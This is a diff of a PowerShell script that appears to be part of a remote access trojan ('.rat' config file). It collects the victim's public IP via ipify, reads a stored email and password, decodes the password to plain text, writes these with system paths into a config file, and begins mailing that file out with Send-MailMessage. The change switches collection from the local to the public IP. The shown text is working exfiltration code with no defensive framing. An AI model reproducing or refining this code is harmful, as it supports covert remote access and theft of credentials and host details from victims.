@@ -26,17 +26,37 @@ Set-Variable -Value (Get-Content PkUbTvqXFIdB.txt) -Name email
 Set-Variable -Name password -Value (Get-Content NzKnmxLrbsBw.txt)
 
 # Get Network Interface and IP Address
-Set-Variable -Value ((Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).InterfaceAlias) -Name InterfaceAlias
-Set-Variable -Name IP -Value ((Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $InterfaceAlias).IPAddress)
+# Set-Variable -Value ((Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).InterfaceAlias) -Name InterfaceAlias
+# Set-Variable -Name IP -Value ((Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $InterfaceAlias).IPAddress)
 
-# Save IP Address to File
+# # Save IP Address to File
+# Set-Variable -Name ipFile -Value ("$initial_dir\ip.txt")
+# $IP | Out-File -FilePath $ipFile
+
+# # Create Configuration File
+# Set-Variable -Name configfile -Value ("$env:UserName.rat")
+# Set-Content -Path $configfile -Value ""
+# Add-Content -Value $IP -Path $configfile
+# Add-Content -Path $configfile -Value $password
+# Add-Content -Value $INITIALPATH -Path $configfile
+# Add-Content -Value $env:temp -Path $configfile
+
+# # Convert Secure Password to Plain Text
+# Set-Variable -Name SecurePassword -Value (ConvertTo-SecureString $password -AsPlainText -Force)
+# Set-Variable -Name plainPassword -Value ([Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)))
+# Add-Content -Value $plainPassword -Path $configfile
+
+# Get Public IP Address
+$PublicIP = Invoke-RestMethod -Uri "https://api64.ipify.org"
+
+# Save Public IP Address to File
 Set-Variable -Name ipFile -Value ("$initial_dir\ip.txt")
-$IP | Out-File -FilePath $ipFile
+$PublicIP | Out-File -FilePath $ipFile
 
 # Create Configuration File
 Set-Variable -Name configfile -Value ("$env:UserName.rat")
 Set-Content -Path $configfile -Value ""
-Add-Content -Value $IP -Path $configfile
+Add-Content -Value $PublicIP -Path $configfile
 Add-Content -Path $configfile -Value $password
 Add-Content -Value $INITIALPATH -Path $configfile
 Add-Content -Value $env:temp -Path $configfile
@@ -45,6 +65,7 @@ Add-Content -Value $env:temp -Path $configfile
 Set-Variable -Name SecurePassword -Value (ConvertTo-SecureString $password -AsPlainText -Force)
 Set-Variable -Name plainPassword -Value ([Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)))
 Add-Content -Value $plainPassword -Path $configfile
+
 
 # Send Email with Configuration File
 Send-MailMessage `
